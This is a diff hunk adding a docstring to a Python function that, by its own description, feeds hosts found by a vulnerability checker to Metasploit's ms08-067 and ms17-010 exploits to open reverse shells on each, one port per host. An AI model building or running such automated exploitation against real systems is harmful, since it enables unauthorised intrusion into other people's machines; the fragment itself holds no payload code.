@@ -6,6 +6,17 @@ import sys
 _exploit_dict_structure = ['ms08-067', 'ms17-010-psexec', 'ms17-010-eternalblue']
 
 def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
+    """
+    @exploit_dict: A dictionary in the format that is retuned by vuln_checker signifying hosts to attack.
+    @start_port: The initial port to start reverse shell handlers on; each host consumes one port, singly incremented.
+    @lhost: The IP address to bind the reverse shell sockets to (ie. for NAT); if None, Metasploit will try to detect.
+
+    Given a dict in the form as returned from check_vulnerable, execute
+    msfconsole and use ms08-067 and ms17-010 to gain shells on the hosts.
+    If there are no hosts defined, this method returns None, otherwise
+    THIS METHOD DOES NOT RETURN.
+    """
+
     port = start_port  # Necessary because this becomes multithreaded
     commands = []  # List of commands to execute in metasploit
 
